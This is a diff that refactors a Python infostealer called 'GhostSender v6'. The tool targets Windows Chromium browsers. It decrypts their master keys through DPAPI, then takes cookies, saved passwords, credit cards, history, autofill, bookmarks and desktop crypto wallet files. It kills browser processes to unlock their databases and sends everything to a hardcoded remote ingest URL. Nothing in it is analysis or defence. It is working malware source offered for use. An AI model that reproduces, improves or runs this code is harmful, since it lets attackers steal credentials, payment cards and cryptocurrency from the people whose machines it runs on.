@@ -2,8 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 GhostSender v6 — Chromium data extraction & exfiltration client.
-Extracts cookies, passwords, cards, history, bookmarks, autofill
-from all Chromium browsers and syncs to Ghost Receiver.
+Based on GhostExtractor engine for maximum reliability.
 """
 
 import os
@@ -12,7 +11,6 @@ import json
 import base64
 import sqlite3
 import shutil
-import tempfile
 import hashlib
 import platform
 import subprocess
@@ -20,41 +18,24 @@ import urllib.request
 import urllib.error
 import ctypes
 from ctypes import wintypes
-from pathlib import Path
-from datetime import datetime, timezone
-from urllib.parse import urlparse
+from datetime import datetime
+import time
 
 # ─── Configuration ─────────────────────────────────────────────────
 RECEIVER_URL = "https://cookies1-lcz0.onrender.com/api/ingest"
-# Set this to your receiver's IP/URL
 
-# ─── Windows DPAPI ─────────────────────────────────────────────────
-class DATA_BLOB(ctypes.Structure):
-    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
-
-def dpapi_decrypt(data: bytes) -> bytes:
-    """Decrypt DPAPI-encrypted bytes."""
-    blob_in = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_char)))
-    blob_out = DATA_BLOB()
-    if ctypes.windll.crypt32.CryptUnprotectData(
-        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
-    ):
-        result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
-        return result
-    raise RuntimeError("DPAPI decryption failed")
-
-# ─── Crypto ────────────────────────────────────────────────────────
+# ─── Windows DPAPI via win32crypt (more reliable than raw ctypes) ──
 try:
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    from win32crypt import CryptUnprotectData
 except ImportError:
-    print("[*] Installing cryptography...")
+    print("[*] Installing pywin32...")
     subprocess.check_call(
-        [sys.executable, "-m", "pip", "install", "cryptography", "--quiet", "--no-warn-script-location"],
+        [sys.executable, "-m", "pip", "install", "pywin32", "--quiet", "--no-warn-script-location"],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    from win32crypt import CryptUnprotectData
 
+# ─── Crypto ────────────────────────────────────────────────────────
 try:
     from Crypto.Cipher import AES
 except ImportError:
@@ -73,57 +54,41 @@ USERNAME = os.getlogin()
 HOSTNAME = platform.node()
 
 def get_machine_id() -> str:
-    """Generate a stable unique machine identifier."""
-    try:
-        key = f"{HOSTNAME}-{USERNAME}-{LOCAL}"
-        return hashlib.sha256(key.encode()).hexdigest()[:32]
-    except Exception:
-        return hashlib.sha256(os.urandom(32)).hexdigest()[:32]
+    key = f"{HOSTNAME}-{USERNAME}-{LOCAL}"
+    return hashlib.sha256(key.encode()).hexdigest()[:32]
 
 MACHINE_ID = get_machine_id()
 
 # ─── Browser Discovery ─────────────────────────────────────────────
 CHROMIUM_BROWSERS = {
     "chrome": ("local", "Google\\Chrome\\User Data"),
-    "chrome-beta": ("local", "Google\\Chrome Beta\\User Data"),
-    "chrome-dev": ("local", "Google\\Chrome Dev\\User Data"),
-    "chrome-sxs": ("local", "Google\\Chrome SxS\\User Data"),
     "edge": ("local", "Microsoft\\Edge\\User Data"),
-    "edge-beta": ("local", "Microsoft\\Edge Beta\\User Data"),
-    "edge-dev": ("local", "Microsoft\\Edge Dev\\User Data"),
     "brave": ("local", "BraveSoftware\\Brave-Browser\\User Data"),
-    "brave-beta": ("local", "BraveSoftware\\Brave-Browser-Beta\\User Data"),
-    "brave-nightly": ("local", "BraveSoftware\\Brave-Browser-Nightly\\User Data"),
-    "vivaldi": ("local", "Vivaldi\\User Data"),
-    "yandex": ("local", "Yandex\\YandexBrowser\\User Data"),
     "opera": ("roaming", "Opera Software\\Opera Stable"),
     "opera-gx": ("roaming", "Opera Software\\Opera GX Stable"),
-    "opera-beta": ("roaming", "Opera Software\\Opera Next"),
-    "opera-developer": ("roaming", "Opera Software\\Opera Developer"),
-    "iridium": ("local", "Iridium\\User Data"),
+    "vivaldi": ("local", "Vivaldi\\User Data"),
+    "yandex": ("local", "Yandex\\YandexBrowser\\User Data"),
     "chromium": ("local", "Chromium\\User Data"),
+    "iridium": ("local", "Iridium\\User Data"),
     "coccoc": ("local", "CocCoc\\Browser\\User Data"),
     "whale": ("local", "Naver\\Naver Whale\\User Data"),
     "avast": ("local", "AVAST Software\\Browser\\User Data"),
     "avg": ("local", "AVG\\Browser\\User Data"),
     "ccleaner": ("local", "CCleaner\\CCleaner Browser\\User Data"),
-    "ghostery": ("local", "Ghostery\\User Data"),
     "epic": ("local", "Epic Privacy Browser\\User Data"),
     "torch": ("local", "Torch\\User Data"),
     "cent": ("local", "CentBrowser\\User Data"),
     "7star": ("local", "7Star\\7Star\\User Data"),
     "sputnik": ("local", "Sputnik\\Sputnik\\User Data"),
-    "uran": ("local", "uCozMedia\\Uran\\User Data"),
     "superbird": ("local", "Superbird\\User Data"),
     "dragon": ("local", "Comodo\\Dragon\\User Data"),
+    "slimjet": ("local", "Slimjet\\User Data"),
     "amigo": ("local", "Amigo\\User Data"),
     "kometa": ("local", "Kometa\\User Data"),
     "orbitum": ("local", "Orbitum\\User Data"),
-    "slimjet": ("local", "Slimjet\\User Data"),
 }
 
 def discover_browsers():
-    """Find all installed Chromium browsers."""
     found = {}
     for name, (scope, rel) in CHROMIUM_BROWSERS.items():
         root = LOCAL if scope == "local" else ROAMING
@@ -135,15 +100,13 @@ def discover_browsers():
 
 # ─── Master Key Extraction ───────────────────────────────────────
 def get_master_key(local_state_path: str) -> bytes:
-    """Extract v10/v11 master key from Local State via DPAPI."""
     with open(local_state_path, "r", encoding="utf-8") as f:
         data = json.load(f)
     enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
-    return dpapi_decrypt(enc_key[5:])  # Skip "DPAPI" prefix
+    return CryptUnprotectData(enc_key[5:], None, None, None, 0)[1]
 
-# ─── Cookie Decryption ─────────────────────────────────────────────
+# ─── Cookie/Password Decryption ────────────────────────────────────
 def decrypt_value(encrypted: bytes, master_key: bytes) -> str:
-    """Decrypt a Chromium-encrypted cookie/password value."""
     if not encrypted:
         return ""
 
@@ -161,57 +124,59 @@ def decrypt_value(encrypted: bytes, master_key: bytes) -> str:
 
     # Raw DPAPI fallback
     try:
-        return dpapi_decrypt(encrypted).decode("utf-8", errors="ignore").strip("\x00")
+        return CryptUnprotectData(encrypted, None, None, None, 0)[1].decode("utf-8", errors="ignore").strip("\x00")
     except Exception:
         return ""
 
-# ─── Database Helpers ──────────────────────────────────────────────
+# ─── Database Helpers (GhostExtractor style) ───────────────────────
 def temp_copy(src: str) -> str:
-    """Copy a locked SQLite DB to temp location."""
     dst = os.path.join(TEMP, f"ghost_{os.path.basename(src)}_{os.urandom(4).hex()}")
     try:
         shutil.copy2(src, dst)
+        time.sleep(0.1)
         return dst
     except Exception as e:
-        print(f"    [!] Copy failed for {src}: {e}")
+        print(f"    [!] Copy failed: {e}")
         return None
 
+def cleanup(path: str):
+    for ext in ("", "-wal", "-journal", "-shm"):
+        try:
+            p = path + ext
+            if os.path.exists(p):
+                os.remove(p)
+        except:
+            pass
+
 def query_db(path: str, sql: str):
-    """Execute read-only query with retry."""
     if not path or not os.path.exists(path):
-        print(f"    [!] DB not found: {path}")
         return []
-    for attempt in range(3):
+    for attempt in range(4):
         tmp = temp_copy(path)
         if not tmp:
-            time.sleep(0.5)
+            time.sleep(0.25 * (attempt + 1))
             continue
         conn = None
         try:
             conn = sqlite3.connect(tmp, timeout=5)
-            result = conn.execute(sql).fetchall()
-            print(f"    [+] Query OK: {len(result)} rows")
-            return result
-        except sqlite3.OperationalError as e:
-            print(f"    [!] SQLite error (attempt {attempt+1}): {e}")
+            return conn.execute(sql).fetchall()
+        except sqlite3.OperationalError:
+            if attempt < 3:
+                time.sleep(0.25 * (attempt + 1))
         except Exception as e:
-            print(f"    [!] Query error (attempt {attempt+1}): {e}")
+            print(f"    [!] Query error: {e}")
+            break
         finally:
             if conn:
                 try:
                     conn.close()
                 except:
                     pass
-            try:
-                os.remove(tmp)
-            except:
-                pass
-        time.sleep(0.5)
+            cleanup(tmp)
     return []
 
 # ─── Profile Discovery ─────────────────────────────────────────────
 def discover_profiles(base_path: str):
-    """List all profile directories in a browser data folder."""
     profiles = []
     try:
         for entry in os.scandir(base_path):
@@ -225,43 +190,36 @@ def discover_profiles(base_path: str):
             elif os.path.exists(os.path.join(entry.path, "Cookies")) or \
                  os.path.exists(os.path.join(entry.path, "Network", "Cookies")):
                 profiles.append(name)
-    except Exception as e:
-        print(f"  [!] Profile discovery error: {e}")
+    except Exception:
+        pass
     return profiles if profiles else ["Default"]
 
 def find_cookie_db(profile_path: str) -> str:
-    """Locate the Cookies database."""
     for p in [os.path.join(profile_path, "Network", "Cookies"), os.path.join(profile_path, "Cookies")]:
         if os.path.exists(p):
             return p
     return None
 
 def find_login_db(profile_path: str) -> str:
-    """Locate the Login Data database."""
     for p in [os.path.join(profile_path, "Login Data"), os.path.join(profile_path, "Network", "Login Data")]:
         if os.path.exists(p):
             return p
     return None
 
 def find_web_data(profile_path: str) -> str:
-    """Locate the Web Data database."""
     p = os.path.join(profile_path, "Web Data")
     return p if os.path.exists(p) else None
 
 def find_history_db(profile_path: str) -> str:
-    """Locate the History database."""
     p = os.path.join(profile_path, "History")
     return p if os.path.exists(p) else None
 
 def find_bookmarks(profile_path: str) -> str:
-    """Locate the Bookmarks JSON file."""
     p = os.path.join(profile_path, "Bookmarks")
     return p if os.path.exists(p) else None
 
 # ─── Data Extraction ───────────────────────────────────────────────
 def extract_cookies(cookie_db: str, master_key: bytes):
-    """Extract and decrypt all cookies."""
-    print(f"    [*] Reading cookies from: {os.path.basename(cookie_db)}")
     rows = query_db(cookie_db, """
         SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite
         FROM cookies
@@ -295,8 +253,6 @@ def extract_cookies(cookie_db: str, master_key: bytes):
     return cookies
 
 def extract_passwords(login_db: str, master_key: bytes):
-    """Extract saved passwords."""
-    print(f"    [*] Reading passwords from: {os.path.basename(login_db)}")
     rows = query_db(login_db, """
         SELECT origin_url, username_value, password_value
         FROM logins
@@ -312,8 +268,6 @@ def extract_passwords(login_db: str, master_key: bytes):
     return passwords
 
 def extract_credit_cards(web_data: str, master_key: bytes):
-    """Extract credit cards."""
-    print(f"    [*] Reading cards from: {os.path.basename(web_data)}")
     rows = query_db(web_data, """
         SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, origin
         FROM credit_cards
@@ -334,7 +288,6 @@ def extract_credit_cards(web_data: str, master_key: bytes):
     return cards
 
 def extract_history(history_db: str, limit: int = 2000):
-    """Extract browsing history."""
     rows = query_db(history_db, f"""
         SELECT url, title, visit_count, last_visit_time
         FROM urls
@@ -350,7 +303,6 @@ def extract_history(history_db: str, limit: int = 2000):
     return history
 
 def extract_autofill(web_data: str):
-    """Extract autofill data."""
     rows = query_db(web_data, """
         SELECT name, value, count, date_last_used
         FROM autofill
@@ -361,7 +313,6 @@ def extract_autofill(web_data: str):
     return [{"field": r[0], "value": r[1], "count": r[2]} for r in rows if r[0] and r[1]]
 
 def walk_bookmarks(node: dict, results: list, folder: str = ""):
-    """Recursively walk bookmark tree."""
     if isinstance(node, dict):
         if node.get("type") == "url":
             results.append({
@@ -376,20 +327,17 @@ def walk_bookmarks(node: dict, results: list, folder: str = ""):
                 walk_bookmarks(val, results, key)
 
 def extract_bookmarks(bookmarks_path: str):
-    """Extract bookmarks from JSON."""
     try:
         with open(bookmarks_path, "r", encoding="utf-8") as f:
             data = json.load(f)
         bookmarks = []
         walk_bookmarks(data.get("roots", {}), bookmarks)
         return bookmarks
-    except Exception as e:
-        print(f"    [!] Bookmark extraction error: {e}")
+    except Exception:
         return []
 
 # ─── Desktop Wallets ───────────────────────────────────────────────
 def extract_desktop_wallets():
-    """Scan for desktop wallet files."""
     wallets = {}
     wallet_configs = {
         "exodus": {
@@ -468,50 +416,21 @@ def extract_desktop_wallets():
 
     return wallets
 
-# ─── User Agent Extraction ─────────────────────────────────────────
-def get_user_agent():
-    """Get system user agent from a known browser."""
-    try:
-        import winreg
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings") as k:
-            ua = winreg.QueryValueEx(k, "User Agent")[0]
-            return ua
-    except:
-        pass
-
-    chrome_paths = [
-        os.path.join(os.getenv("PROGRAMFILES", ""), "Google", "Chrome", "Application", "chrome.exe"),
-        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
-    ]
-    for cp in chrome_paths:
-        if os.path.exists(cp):
-            return (
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                "AppleWebKit/537.36 (KHTML, like Gecko) "
-                "Chrome/126.0.0.0 Safari/537.36"
-            )
-    return None
-
 # ─── Process Killer ────────────────────────────────────────────────
 def kill_browsers():
-    """Kill browser processes to unlock databases."""
     targets = [
         "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe",
-        "chromium.exe", "iridium.exe", "browser.exe", "yandex.exe",
+        "chromium.exe", "iridium.exe", "browser.exe",
     ]
     for proc in targets:
         try:
-            result = os.system(f"taskkill /F /IM {proc} >nul 2>&1")
-            if result == 0:
-                print(f"  [+] Killed {proc}")
+            os.system(f"taskkill /F /IM {proc} >nul 2>&1")
         except:
             pass
-    import time
-    time.sleep(2)
+    time.sleep(1.5)
 
 # ─── Send to Receiver ──────────────────────────────────────────────
 def send_to_receiver(payload: dict):
-    """POST JSON payload to receiver."""
     data = json.dumps(payload).encode("utf-8")
     req = urllib.request.Request(
         RECEIVER_URL,
@@ -531,7 +450,6 @@ def send_to_receiver(payload: dict):
 
 # ─── Main Extraction ─────────────────────────────────────────────
 def extract_all():
-    """Extract data from all browsers and return payload."""
     print("[+] GhostSender v6 starting...")
     print(f"[+] Machine ID: {MACHINE_ID}")
 
@@ -545,7 +463,6 @@ def extract_all():
     print(f"[+] Found {len(browsers)} browser(s): {', '.join(browsers.keys())}")
 
     profiles_data = []
-    all_user_agents = {}
 
     for browser_name, base_path in browsers.items():
         print(f"\n[*] Processing {browser_name}...")
@@ -557,16 +474,6 @@ def extract_all():
         except Exception as e:
             print(f"  [!] Master key failed: {e}")
             continue
-
-        # Read user agent from Local State if available
-        try:
-            with open(ls_path, "r", encoding="utf-8") as f:
-                ls_data = json.load(f)
-            ua = ls_data.get("os_crypt", {}).get("user_agent")
-            if ua:
-                all_user_agents[browser_name] = ua
-        except:
-            pass
 
         profiles = discover_profiles(base_path)
         print(f"  [+] Found {len(profiles)} profile(s)")
@@ -663,7 +570,7 @@ def extract_all():
         "username": USERNAME,
         "os_info": f"{platform.system()} {platform.release()}",
         "ip": "",
-        "user_agent": get_user_agent(),
+        "user_agent": None,
         "profiles": profiles_data,
         "desktop_wallets": desktop_wallets,
     }
@@ -678,7 +585,6 @@ def main():
 
     if RECEIVER_URL == "http://YOUR_RECEIVER_IP:3000/api/ingest":
         print("[!] Please set RECEIVER_URL in the script before running")
-        print("    Edit line 22: RECEIVER_URL = 'http://YOUR_IP:3000/api/ingest'")
         sys.exit(1)
 
     payload = extract_all()
